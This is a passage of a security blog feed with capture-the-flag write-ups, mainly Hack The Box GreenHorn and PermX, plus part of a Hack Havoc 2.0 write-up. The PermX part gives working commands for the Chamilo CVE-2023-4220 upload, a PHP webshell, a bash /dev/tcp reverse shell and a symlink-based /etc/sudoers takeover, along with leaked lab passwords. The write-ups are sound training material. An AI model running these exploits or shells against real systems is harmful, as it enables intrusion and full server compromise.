+SF:x20Request")%r(HTTPOptions,1A4,"HTTP/1\.0\x20405\x20Method\x20Not\x20Al
+SF:lowed\r\nAllow:\x20HEAD\r\nAllow:\x20HEAD\r\nAllow:\x20GET\r\nCache-Con
+SF:trol:\x20max-age=0,\x20private,\x20must-revalidate,\x20no-transform\r\n
+SF:Set-Cookie:\x20i_like_gitea=b0bc6ae68de3fbb6;\x20Path=/;\x20HttpOnly;\x
+SF:20SameSite=Lax\r\nSet-Cookie:\x20_csrf=GoskDxug-DQHcGB4MQuqxdNJXCk6MTcz
+SF:MTQzMTQ2MjM2MjAzMTY4OA;\x20Path=/;\x20Max-Age=86400;\x20HttpOnly;\x20Sa
+SF:meSite=Lax\r\nX-Frame-Options:\x20SAMEORIGIN\r\nDate:\x20Tue,\x2012\x20
+SF:Nov\x202024\x2017:11:02\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RTSP
+SF:Request,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text
+SF:/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20R
+SF:equest");
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 402.11 seconds
+
+</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "$ip GreenHorn.htb" | sudo tee -a /etc/hosts
+</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──(root㉿kali)-[/home/angrybird/Desktop/Openvpn]
+└─# dirb http://GreenHorn.htb
+
+-----------------
+DIRB v2.22    
+By The Dark Raver
+-----------------
+
+START_TIME: Tue Nov 12 22:51:10 2024
+URL_BASE: http://GreenHorn.htb/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612                                                          
+
+---- Scanning URL: http://GreenHorn.htb/ ----
++ http://GreenHorn.htb/admin.php (CODE:200|SIZE:4026)                                    
+==&gt; DIRECTORY: http://GreenHorn.htb/data/                                                
+==&gt; DIRECTORY: http://GreenHorn.htb/docs/                                                
+==&gt; DIRECTORY: http://GreenHorn.htb/files/                                               
+==&gt; DIRECTORY: http://GreenHorn.htb/images/                                              
++ http://GreenHorn.htb/javadoc (CODE:200|SIZE:92)                                        
++ http://GreenHorn.htb/java-plugin (CODE:200|SIZE:92)                                    
++ http://GreenHorn.htb/javascript (CODE:200|SIZE:92)                                     
++ http://GreenHorn.htb/local (CODE:200|SIZE:92)                                          
++ http://GreenHorn.htb/locale (CODE:200|SIZE:92)                                         
++ http://GreenHorn.htb/localstart (CODE:200|SIZE:92)                                     
++ http://GreenHorn.htb/location (CODE:200|SIZE:92)                                       
++ http://GreenHorn.htb/locations (CODE:200|SIZE:92)                                      
++ http://GreenHorn.htb/locator (CODE:200|SIZE:92)                                        
++ http://GreenHorn.htb/lock (CODE:200|SIZE:92)
++ http://GreenHorn.htb/locked (CODE:200|SIZE:92)                                         
++ http://GreenHorn.htb/lockout (CODE:200|SIZE:92)                                        
++ http://GreenHorn.htb/lofiversion (CODE:200|SIZE:92)                                    
++ http://GreenHorn.htb/log (CODE:200|SIZE:92)                                            
++ http://GreenHorn.htb/Log (CODE:200|SIZE:92)                                            
++ http://GreenHorn.htb/log4j (CODE:200|SIZE:92)                                          
++ http://GreenHorn.htb/robots.txt (CODE:200|SIZE:47)                                     
++ http://GreenHorn.htb/send_pwd (CODE:200|SIZE:2)                                        
++ http://GreenHorn.htb/send_to_friend (CODE:200|SIZE:2)                                  
++ http://GreenHorn.htb/sendform (CODE:200|SIZE:2)                                        
++ http://GreenHorn.htb/sendfriend (CODE:200|SIZE:2)                                      
++ http://GreenHorn.htb/sendmail (CODE:200|SIZE:2)                                        
++ http://GreenHorn.htb/sendmessage (CODE:200|SIZE:2)                                     
++ http://GreenHorn.htb/send-password (CODE:200|SIZE:2)                                   
++ http://GreenHorn.htb/sendpm (CODE:200|SIZE:2)                                          
++ http://GreenHorn.htb/sendthread (CODE:200|SIZE:2)                                      
++ http://GreenHorn.htb/sendto (CODE:200|SIZE:2)                                          
++ http://GreenHorn.htb/sendtofriend (CODE:200|SIZE:2)                                    
++ http://GreenHorn.htb/sensepost (CODE:200|SIZE:2)                                       
++ http://GreenHorn.htb/sensor (CODE:200|SIZE:2)                                          
++ http://GreenHorn.htb/sent (CODE:200|SIZE:2)                                            
++ http://GreenHorn.htb/seo (CODE:200|SIZE:2)                                             
++ http://GreenHorn.htb/serial (CODE:200|SIZE:2)                                          
++ http://GreenHorn.htb/serv (CODE:200|SIZE:2)                                            
++ http://GreenHorn.htb/serve (CODE:200|SIZE:2)                                           
++ http://GreenHorn.htb/server (CODE:200|SIZE:2)                                          
++ http://GreenHorn.htb/Server (CODE:200|SIZE:2)                                          
++ http://GreenHorn.htb/server_admin_small (CODE:200|SIZE:2)                              
++ http://GreenHorn.htb/server_stats (CODE:200|SIZE:2)                                    
++ http://GreenHorn.htb/ServerAdministrator (CODE:200|SIZE:2)                             
++ http://GreenHorn.htb/SERVER-INF (CODE:200|SIZE:2)                                      
++ http://GreenHorn.htb/server-info (CODE:200|SIZE:2)                                     
++ http://GreenHorn.htb/servers (CODE:200|SIZE:2)                                         
++ http://GreenHorn.htb/server-status (CODE:200|SIZE:2)                                   
++ http://GreenHorn.htb/service (CODE:200|SIZE:2)                                         
++ http://GreenHorn.htb/servicelist (CODE:200|SIZE:2)                                     
++ http://GreenHorn.htb/services (CODE:200|SIZE:2)                                        
++ http://GreenHorn.htb/Services (CODE:200|SIZE:2)                                        
++ http://GreenHorn.htb/servicio (CODE:200|SIZE:2)                                        
++ http://GreenHorn.htb/servicios (CODE:200|SIZE:2)                                       
++ http://GreenHorn.htb/servlet (CODE:200|SIZE:2)                                         
++ http://GreenHorn.htb/Servlet (CODE:200|SIZE:2)                                         
++ http://GreenHorn.htb/servlets (CODE:200|SIZE:2)                                        
++ http://GreenHorn.htb/Servlets (CODE:200|SIZE:2)                                        
++ http://GreenHorn.htb/servlets-examples (CODE:200|SIZE:2)
+</code></pre></div></div> <p>After discovering GreenHorn.htb’s admin panel (/admin.php), version 4.7.18 was identified, which is vulnerable to file upload reverse shell exploitation. Further enumeration revealed a service running on port 3000. I started reading code after some time i got ( <strong>GreenAdmin/GreenHorn -&gt; Data -&gt; Settings -&gt; Pass.php</strong> )</p> <p>In pass.php i got a hash cracked it with crackstation. I found the website is running on pluck 4.7.18 and I searched exploitDB for vulnerabilities associated with this version and I found out that there is a remote code execution exploit which allow potential attacker to upload malicious file in zip format on the website.</p> <p>With that i had uploded a php revershell in zip format.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>zip reverse_shell.zip reverse_shell.php
+</code></pre></div></div> <ul> <li> <p>In backgroung nc is running <strong>nc -lvnp 4444</strong></p> </li> <li>Next, I navigated to the option section on the website and clicked on “manage modules” and clicked on “install a module”. This displayed a webpage where I can upload a file. So, I uploaded the reverse-shell.zip file I have on my machine andgot a reverse shell response</li> <li>I changed the directory to home and list all the files/folders in it. Next, I tried to change the current user to junior by running the super user command: su junior and I was prompted to type a password, I used <strong>iloveyou1</strong> and I got the shell as.</li> </ul> <p><strong>junior@greenhorn:/home$</strong> I changed the directory to the root folder to get the user.txt file and I run the following command to read the file:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>cat user.txt
+</code></pre></div></div> <p>After the file has been successfully created, I will establish an http server on port 3333 to copy the file from the shell to my machine by running the following command:</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python3 -m http.server 3333
+
+wget greenhorn.htb:3333/openvas.pdf
+</code></pre></div></div> <p>Next, I will open the pdf file to view the content. In the pdf, a section to the file was blurred and this contains a secret text might be password to get the root flag. To view the content of the blurred part, I will upload the file to https://www.adobe.com/in/acrobat/online/extract-pdf-pages.html, a website for extracting embedded images in pdf files.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>sidefromsidetheothersidesidefromsidetheotherside
+</code></pre></div></div> <p>After extracting the image i got this text i directly tired to login in via root user -</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>su root
+password: sidefromsidetheothersidesidefromsidetheotherside
+
+ls
+cleanup.sh  restart.sh  root.txt
+
+cat root.txt
+************
+</code></pre></div></div> <p>Tbh it’s a easy Machine.</p>]]></content><author><name></name></author><category term="Revershell Recon"/><summary type="html"><![CDATA[Detailed writeup of [PermX](https://app.hackthebox.com/machines/617)?]]></summary></entry><entry><title type="html">Hackthebox PermX Machine Writeup</title><link href="https://oxapavan.github.io/blog/2024/PermX-Machine-Writeup/" rel="alternate" type="text/html" title="Hackthebox PermX Machine Writeup"/><published>2024-11-10T00:00:00+00:00</published><updated>2024-11-10T00:00:00+00:00</updated><id>https://oxapavan.github.io/blog/2024/PermX-Machine-Writeup</id><content type="html" xml:base="https://oxapavan.github.io/blog/2024/PermX-Machine-Writeup/"><![CDATA[<div style="display: flex; justify-content: center;"> <img src="/assets/HTB/banner.png" alt="HTB Banner" style="max-width: 100%; height: auto; text-align: center;"/> </div> <h3 id="overview">Overview</h3> <p><a href="https://app.hackthebox.com/machines/PermX">PermX</a> focuses on Linux permissions, starting with Chamilo’s file upload leading to shell access. Using shared credentials for lateral movement, followed by ACL abuse through symlinks to gain root - with multiple successful and failed paths explored for maximum learning.</p> <h3 id="cve-2023-4220-chamilo-lms-unauthenticated-big-upload-file-remote-code-execution">(CVE-2023-4220) Chamilo LMS Unauthenticated Big Upload File Remote Code Execution</h3> <ul> <li>OS Linux Linux</li> <li>Base Points Easy [20]</li> </ul> <h2 id="recon">Recon</h2> <h3 id="nmap">nmap</h3> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>angrybird@angrybird$ nmap -p- -sC -sV $ip
+Starting Nmap 7.80 ( https://nmap.org ) at 2024-07-06 21:38 EDT
+Nmap scan report for $ip
+Host is up (0.087s latency).
+
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.52
+|_http-server-header: Apache/2.4.52 (Ubuntu)
+|_http-title: Did not follow redirect to http://permx.htb
+Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 9.82 seconds
+</code></pre></div></div> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>echo "$ip permx.htb" | sudo tee -a /etc/hosts
+</code></pre></div></div> <h3 id="subdomain-fuzzing">Subdomain Fuzzing</h3> <ul> <li>FUZZ for subdomain’s, I got nothing in permx.htb ``` ffuf -u $ip -H “Host: FUZZ.permx.htb” -w /subdomains-top1million-20000.txt -ac</li> </ul> <p>www [Status: 200, Size: 36182, Words: 12829, Lines: 587, Duration: 88ms] lms [Status: 200, Size: 19347, Words: 4910, Lines: 353, Duration: 122ms]</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+- I’ll add the base domain as well as both subdomains to my /etc/hosts file:
+
+</code></pre></div></div> <p>$ip permx.htb www.permx.htb lms.permx.htb</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- After some fuzzing on both subdomains The base domain and the www subdomain seem to return the same page.
+
+
+#### lms.permx.htb
+This site has a login form for an instance of Chamilo.
+
+Chamilo is a PHP-based online training platform. It is also hosted on [GitHub](https://github.com/chamilo/chamilo-lms). I had observed README.md file. I read content on http://lms.permx.htb/README.md &amp; documentation. I observed version is on There are references to the 1.11.x.
+
+Review of CVE Details indicates multiple vulnerabilities affecting versions through 1.11.XX. Based on the version information from PermX, several of these security issues may be applicable and warrant version verification.
+
+[CVE-2023-4220](https://nvd.nist.gov/vuln/detail/CVE-2023-4220), [MyScript](https://github.com/oxapavan/CVE-2023-4220-HTB-PermX) enables RCE through unsanitized file uploads in the /main/inc/lib/javascript/bigupload/files directory. While labeled as XSS in the [StarLabs advisory](https://starlabs.sg/advisories/23/23-4220/), the core issue is inadequate upload validation allowing arbitrary PHP files. Testing confirms the vulnerable directory exists on PermX. That Felt something similar to lab machine.
+
+
+
+- I’ll test the webshell by uploading cmd chell :-
+</code></pre></div></div> <p>echo ‘&lt;?php system($_GET[“cmd”]); ?&gt;’ &gt; test.php</p> <p>curl -F ‘bigUploadFile=@test.php’‘http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported’ The file has successfully been uploaded.</p> <p>curl http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/test.php?cmd=id uid=33(www-data) gid=33(www-data) groups=33(www-data)</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+## shell
+
+To establish a reverse shell, we first set up a Netcat listener with -l (listen mode), -n (prevent DNS resolution), -v (verbose), and -p 4455 (port specification).
+Next, we create rev.php containing PHP code that triggers a reverse shell connection from the target server back to our machine, executing bash -c to spawn an interactive shell.
+
+</code></pre></div></div> <p>echo ‘&lt;?php system(“bash -c ‘'‘bash -i &gt;&amp; /dev/tcp/$ip/4444 0&gt;&amp;1’'’”);?&gt;’ &gt; reverseshell.php</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>After receiving confirmation of successful file upload, we issue a GET request to rev.php. This execution triggers the reverse shell connection back to our waiting Netcat listener.
+</code></pre></div></div> <p>nc -lnvp 4444</p> <p>curl -F ‘bigUploadFile=@reverseshell.php’ ‘http://lms.permx.htb/main/inc/lib/javascript/bigupload/inc/bigUpload.php?action=post-unsupported’ The file has successfully been uploaded.</p> <p>curl ‘http://lms.permx.htb/main/inc/lib/javascript/bigupload/files/reverseshell.php’</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Our Netcat listener shows a successful connection  port, confirming shell access. We're now operating with www-data privileges, enabling server interaction under this user context.
+
+
+</code></pre></div></div> <p>nc -lnvp 4455 listening on [any] 4455 … connect to [$ip] from (UNKNOWN) [$ip] port bash: cannot set terminal process group (1174): Inappropriate ioctl for device bash: no job control in this shell www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$ id id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@permx:/var/www/chamilo/main/inc/lib/javascript/bigupload/files$</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+After some struggle i got this files
+</code></pre></div></div> <p>www-data@permx:/var/www$ ls chamilo/ CODE_OF_CONDUCT.md README.md bin cli-config.php composer.lock favicon.ico license.txt plugin terms.php vendor whoisonline.php CONTRIBUTING.md app bower.json codesize.xml custompages favicon.png main robots.txt user.php web whoisonlinesession.php LICENSE apple-touch-icon.png certificates composer.json documentation index.php news_list.php src user_portal.phpweb.config</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>I checked /cli-config.php file nothing intresting but i got **$configurationFile = __DIR__.'/app/config/configuration.php';** via cli-config.php file.
+
+There is some config data
+</code></pre></div></div> <p>// Database connection settings. $_configuration[‘db_host’] = ‘localhost’; $_configuration[‘db_port’] = ‘3306’; $_configuration[‘main_database’] = ‘chamilo’; $_configuration[‘db_user’] = ‘chamilo’; $_configuration[‘db_password’] = ‘03F6lY3uXAP2bkW8’; // Enable access to database management for platform admins. $_configuration[‘db_manager_enabled’] = false; …………………….. ……………………..</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
+Upon trying to log in via SSH as the user mtz using the database password we found earlier, we see that this works.
+
+</code></pre></div></div> <p>ssh mtz@permx.htb The authenticity of host ‘permx.htb ‘ can’t be established. ED25519 key fingerprint is SHA256:u9/wL+62dkDBqxAG3NyMhz/2FTBJlmVC1Y1bwaNLqGA. This key is not known by any other names. Are you sure you want to continue connecting (yes/no/[fingerprint])? yes Warning: Permanently added ‘permx.htb’ (ED25519) to the list of known hosts. mtz@permx.htb’s password:03F6lY3uXAP2bkW8 Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-113-generic x86_64)</p> <ul> <li>Documentation: https://help.ubuntu.com</li> <li>Management: https://landscape.canonical.com</li> <li>Support: https://ubuntu.com/pro mtz@permx:~$ ```</li> </ul> <p>&amp; Here i can read user.txt - <strong>**</strong><strong>**</strong><strong>**</strong>*****</p> <ul> <li>There isn’t anything of interest in mtz’s home directory:</li> </ul> <p>Here <strong>Privilege Escalation</strong> raises.</p> <p>Sudo permission enumeration reveals mtz can run /opt/acl.sh with unrestricted user impersonation (ALL) and without password authentication, suggesting a clear privilege escalation path.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtz@permx:~$ sudo -l
+Matching Defaults entries for mtz on permx:
+env_reset, mail_badpass,
+secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/
+snap/bin, use_pty
+User mtz may run the following commands on permx:
+(ALL : ALL) NOPASSWD: /opt/acl.sh
+mtz@permx:~$
+</code></pre></div></div> <p>whatttttt acl.sh ????</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtz@permx:~$ cat /opt/acl.sh
+#!/bin/bash
+if [ "$#" -ne 3 ]; then
+/usr/bin/echo "Usage: $0 user perm file"
+exit 1
+fi
+user="$1"
+perm="$2"
+target="$3"
+if [[ "$target" != /home/mtz/* || "$target" == *..* ]]; then
+/usr/bin/echo "Access denied."
+exit 1
+fi
+# Check if the path is a file
+if [ ! -f "$target" ]; then
+/usr/bin/echo "Target must be a file."
+exit 1
+fi
+/usr/bin/sudo /usr/bin/setfacl -m u:"$user":"$perm" "$target"
+mtz@permx:~$
+</code></pre></div></div> <p>Analysis of /opt/acl.sh reveals it modifies file ACLs after basic path validation to prevent traversal. We can exploit this SUID script by creating a symbolic link named ‘root’ in mtz’s home directory pointing to /etc/sudoers, potentially enabling privilege escalation.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtz@permx:~$ ln -s /etc/sudoers root
+</code></pre></div></div> <p>Using acl.sh, we grant ourselves (mtz) read/write permissions on our symbolic link, effectively gaining access to modify /etc/sudoers through the link.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/root
+</code></pre></div></div> <p>We then append a new sudoers entry through our symbolic link, granting mtz unrestricted sudo access without password requirements.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtz@permx:~$ echo "mtz ALL=(ALL:ALL) NOPASSWD: ALL" &gt;&gt; /home/mtz/root
+</code></pre></div></div> <p>With our modified sudoers entry in place, we execute ‘sudo bash’ to obtain a root shell with full system privileges</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>mtz@permx:~$ sudo bash
+root@permx:/home/mtz# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre></div></div> <p>We can now proceed to grab the root flag.</p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@permx:/home/mtz# cat /root/root.txt
+**************************
+root@permx:/home/mtz#
+</code></pre></div></div> <p>This is my first HTB Writeup 😅</p>]]></content><author><name></name></author><category term="Revershell"/><category term="Privilege Escalation"/><category term="Recon"/><summary type="html"><![CDATA[Detailed writeup of [PermX](https://app.hackthebox.com/machines/PermX)]]></summary></entry><entry><title type="html">Hack Havoc 2.0 CTF Detailed Writeup</title><link href="https://oxapavan.github.io/blog/2024/Hack-Havoc-2.0-CTF-Detailed-Writeup/" rel="alternate" type="text/html" title="Hack Havoc 2.0 CTF Detailed Writeup"/><published>2024-10-31T00:00:00+00:00</published><updated>2024-10-31T00:00:00+00:00</updated><id>https://oxapavan.github.io/blog/2024/Hack-Havoc-2.0-CTF-Detailed-Writeup</id><content type="html" xml:base="https://oxapavan.github.io/blog/2024/Hack-Havoc-2.0-CTF-Detailed-Writeup/"><![CDATA[<h2 id="overview">Overview</h2> <p>I participated in Hack Havoc 2.0 CTF and secured 6th position. The competition featured various categories including Web, Crypto, Forensics, Mobile, and Cloud challenges. This writeup details my approach to each challenge, explaining the thought process and methodology. Sadly with fraction seconds i lost my TOP 5 Positions.</p> <h2 id="welcome-challenges">Welcome Challenges</h2> <h3 id="welcome-to-cybermaterial">Welcome To CyberMaterial</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Welcome to Hack Havoc 2.0. The Premiere CTF Hosted by Cybermaterial.
+Before we start the journey, let's make a detour to our Discord Server and Instagram.
+Friends are crucial for every adventure...
+Flag Format: CM{String}
+
+https://discord.com/invite/ATw3qYMX7e
+https://www.instagram.com/cybermaterial_/
+https://www.linkedin.com/company/cybermaterial/
+</code></pre></div></div> <p><strong>Analysis &amp; Solution:</strong></p> <ol> <li>Initial Approach: <ul> <li>Challenge mentioned Discord and Instagram</li> <li>Flag format suggested two parts would need to be combined</li> </ul> </li> <li>Discord Analysis: <ul> <li>Joined the Discord server</li> <li>Explored various channels</li> <li>Checked Discord bot commands</li> <li>Found that <code class="language-plaintext highlighter-rouge">/flag</code> command returned first part of the flag</li> </ul> </li> <li>Instagram Search: <ul> <li>Visited CyberMaterial’s Instagram profile (@cybermaterial_)</li> <li>Found second part of flag in profile</li> </ul> </li> </ol> <h3 id="bonus-challenge">Bonus Challenge</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Follow CyberMaterial on LinkedIn and submit proof for bonus points.
+</code></pre></div></div> <p><strong>Solution:</strong></p> <ol> <li>Simple process: <ul> <li>Follow LinkedIn page</li> <li>Take screenshot</li> <li>Submit through Google form</li> <li>Points automatically added</li> </ul> </li> </ol> <h2 id="mobile-challenge">Mobile Challenge</h2> <h3 id="apk-ocalypse-now">APK-ocalypse Now!</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Put on your detective hat and dive into our mysterious APK! 
+Get it and uncover hidden treasures—will it be memes, cat videos, or just code? 
+Get ready to crack the APK-ocalypse!
+</code></pre></div></div> <p>https://ctf.cybermaterial.com/files/aeeca9f91264d4b2c75f9f6e3a135592/hackhavoc.apk?token=eyJ1c2VyX2lkIjoxNCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6OH0.ZyYfWw.m-fEsAotDRaovzYws8xFfvfZnrQ</p> <p><strong>Analysis &amp; Solution:</strong></p> <ol> <li>Initial Analysis: <ul> <li>Downloaded APK file</li> <li>Used jadx-gui for decompilation</li> <li>Strategy: Check common locations for hidden data <ul> <li>AndroidManifest.xml</li> <li>Resource files</li> <li>String resources</li> <li>Layout files</li> </ul> </li> </ul> </li> <li>Investigation Steps: <ul> <li>Opened APK in jadx-gui</li> <li>Analyzed manifest file first (common place for configuration data)</li> <li>Found suspicious string: <code class="language-plaintext highlighter-rouge">PZ{U1qq3a_7Y4t_1a_Z4aVS35G}</code></li> </ul> </li> <li>Decoding Process: <ul> <li>String looked like encoded flag</li> <li>Pattern suggested simple substitution</li> <li>Tested ROT13 first (common encoding)</li> <li>Successfully decoded to: <code class="language-plaintext highlighter-rouge">CM{H1dd3n_7L4g_1n_M4nIF35T}</code></li> </ul> </li> </ol> <h2 id="steganography-challenge">Steganography Challenge</h2> <h3 id="incidents-in-disguise">Incidents in Disguise</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Is this an image or a game of Hide and Seek? 
+Between the incidents of May and June, secrets lurk in the pixels! 
+Something reversing makes things easier.
+
+Hints:
+- Incidents in Disguise Reverse
+- You Rock with the latest one and try with some top you Rock list
+- Password contains: amos amos amos
+</code></pre></div></div> <p>https://ctf.cybermaterial.com/files/ca8df8aeb561c397c02a22cd5adcb820/file.jpg token=eyJ1c2VyX2lkIjoxNCwidGVhbV9pZCI6bnVsbCwiZmlsZV9pZCI6NH0.ZyY1ZQ.Wk8RcsEn3rnmAGYC5VhXZy6fLpk</p> <p><strong>Analysis &amp; Solution:</strong></p> <ol> <li>Initial Analysis: <ul> <li>Given a JPG file</li> <li>Hints suggest password-protected steganography</li> <li>Multiple mentions of “amos” and “Rock” (suggesting rockyou.txt)</li> </ul> </li> <li>Password Discovery: <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c"># Filter rockyou.txt for potential passwords</span>
+<span class="nb">cat </span>rockyou.txt | <span class="nb">grep</span> <span class="s2">"amos"</span> <span class="o">&gt;</span> pass.txt
+
+<span class="c"># Created script to automate password testing</span>
+<span class="c">#!/bin/bash</span>
+<span class="nv">image</span><span class="o">=</span><span class="s2">"file.jpg"</span>
+<span class="nv">wordlist</span><span class="o">=</span><span class="s2">"pass.txt"</span>
+
+<span class="k">while </span><span class="nb">read </span>password<span class="p">;</span> <span class="k">do
+    </span><span class="nb">echo</span> <span class="s2">"Trying password: </span><span class="nv">$password</span><span class="s2">"</span>
+    steghide extract <span class="nt">-sf</span> <span class="s2">"</span><span class="nv">$image</span><span class="s2">"</span> <span class="nt">-p</span> <span class="s2">"</span><span class="nv">$password</span><span class="s2">"</span> <span class="nt">-f</span> <span class="o">&gt;</span> /dev/null 2&gt;&amp;1
+       
+    <span class="k">if</span> <span class="o">[</span> <span class="nv">$?</span> <span class="nt">-eq</span> 0 <span class="o">]</span><span class="p">;</span> <span class="k">then
+        </span><span class="nb">echo</span> <span class="s2">"[+] Success! Password found: </span><span class="nv">$password</span><span class="s2">"</span>
+        <span class="nb">exit </span>0
+    <span class="k">fi
+done</span> &lt; <span class="s2">"</span><span class="nv">$wordlist</span><span class="s2">"</span>
+</code></pre></div> </div> </li> <li>Extraction: <ul> <li>Found password: “*7¡Vamos!”</li> <li>Used steghide to extract hidden data: <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract <span class="nt">-sf</span> file.jpg <span class="nt">-p</span> <span class="s2">"*7¡Vamos!"</span>
+<span class="nb">cat </span>flag.txt
+</code></pre></div> </div> </li> <li>Retrieved flag: <code class="language-plaintext highlighter-rouge">CM{Bru73_f0rc3_i5_b35t}</code></li> </ul> </li> </ol> <h3 id="p13ces">P13ces</h3> <h2 id="description">Description</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Once upon a time in the land of pixels, a sneaky group of flags decided to hide in the most unexpected places—inside ordinary images! ☠️ Your quest, brave adventurer, is to embark on a pixelated treasure hunt. Help Lira uncover the hidden pieces, decode the message, and craft the legendary flag.
+Flag Formate : CM{}
+</code></pre></div></div> <p>https://sites.google.com/cybermaterial.com/lira-journey/</p> <h2 id="solution-path">Solution Path</h2> <h3 id="1-initial-discovery">1. Initial Discovery</h3> <ul> <li>Found website with multiple images</li> <li>Noticed text in pictures ( <strong>P13ces}</strong> )</li> <li>Images had sequence numbers</li> </ul> <h3 id="2-steganography-extraction">2. Steganography Extraction</h3> <p>Using steghide on each image in sequence:</p> <div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>steghide extract <span class="nt">-sf</span> 1.jpg  <span class="c"># No password needed</span>
+steghide extract <span class="nt">-sf</span> 2.jpg  <span class="c"># Password from image 1</span>
+steghide extract <span class="nt">-sf</span> 3.jpg  <span class="c"># Password from image 2</span>
+steghide extract <span class="nt">-sf</span> 4.jpg  <span class="c"># Password from image 3</span>
+
+3. Extracted Pieces
+
+- Image 1: <span class="o">{</span>Break_
+- Image 2: 1t
+- Image 3: _1int0_
+- Image 4: Riddle leading to number <span class="s2">"4"</span>
+- Final visible piece: p13ces<span class="o">}</span>
+
+<span class="k">**</span>Combined pieces <span class="k">in </span>order: CM<span class="o">{</span>Break_1t_1int0_4_p13ces<span class="o">}</span><span class="k">**</span>
+
+</code></pre></div></div> <h2 id="osint-challenge">OSINT Challenge</h2> <h3 id="hack-uncovered">Hack Uncovered</h3> <p><strong>Description:</strong></p> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Think you can find the flag buried in a sea of data? 
+This PDF is packed with juicy details about July's 2024 incidents/alerts.
+Can you navigate the top threats, Vulnerability, and regulations to uncover what's hidden?
+Flag: CM{a_b_c}
+</code></pre></div></div> <p><strong>Analysis &amp; Solution:</strong></p> <ol> <li>PDF Analysis: <ul> <li>I got PDF in LinkedIn with same description</li> <li>Carefully read through PDF looking for three components</li> <li>Challenge specifically mentioned: <ul> <li>Top threats</li> <li>Vulnerabilities</li> <li>Regulations</li> </ul> </li> </ul> </li> <li>Information Collection: <ul> <li>Found DarkGate listed as top threat</li> <li>Identified CVE-2024-5217 as key vulnerability</li> <li>Located KOPSA as significant regulation</li> </ul> </li> <li>Flag Construction: <ul> <li>Combined findings in specified format</li> <li>Flag: <code class="language-plaintext highlighter-rouge">CM{DarkGate_CVE-2024-5217_KOPSA}</code></li> </ul> </li> </ol> <h3 id="cybermaterial-edition">CyberMaterial Edition</h3> <h2 id="description-1">Description</h2> <div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Hall of Hacks July 2024 Edition delves into the latest cybersecurity triumphs and crises, spotlighting top threat actors from hacktivists to cybercriminals, alongside major breaches, legal battles, and industry-shaping developments.
+But wait—there's a hidden flag buried among the chaos!
